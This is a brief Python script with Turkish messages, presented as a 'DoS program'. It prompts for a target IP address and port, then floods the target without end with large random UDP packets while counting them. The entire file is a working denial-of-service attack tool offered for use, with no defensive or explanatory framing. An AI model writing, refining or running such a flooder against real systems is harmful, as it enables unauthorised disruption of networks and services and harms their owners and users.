import os
import socket
import time
import random
import colorama
from colorama import Fore, Back
colorama.init()

os.system('cls')

print(Fore.LIGHTMAGENTA_EX + 'sistem gereksinimleri toplanıyor...')
time.sleep(3)
print('ağ bağlantısı kontrol ediliyor')
time.sleep(4)

os.system('cls')

logo = Fore.RED +'''
       .     .                   .
,-.    |-    |     ,-.    ,-.    |-       ,-.
,-|    |     |     ,-|    | |    |        `-.
`-^    `'    `'    `-^    ' '    `'       `-'
DoS program
---   maded by c4kr   ---
'''

print(logo)

time.sleep(3)

target_ip = input(Fore.LIGHTBLUE_EX + 'target IP :')
print('[+] IP algılandı !!')

time.sleep(1)

target_port = int(input('target PORT : '))
print('[+] PORT algılandı !!')

time.sleep(1)

os.system('cls')
print(Fore.LIGHTGREEN_EX + 'saldırıya hazırlanılıyor...')
print('tahmini sure 5 saniye')
time.sleep(3)

print('sistemler hazırlandı,saldırı başlıyor...')
time.sleep(1)

bytes = random._urandom(60000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac = 0

while True :
       sock.sendto(bytes,(str(target_ip), target_port))
       sayac=sayac+1
       print('attack started number of packets:%s'%(sayac))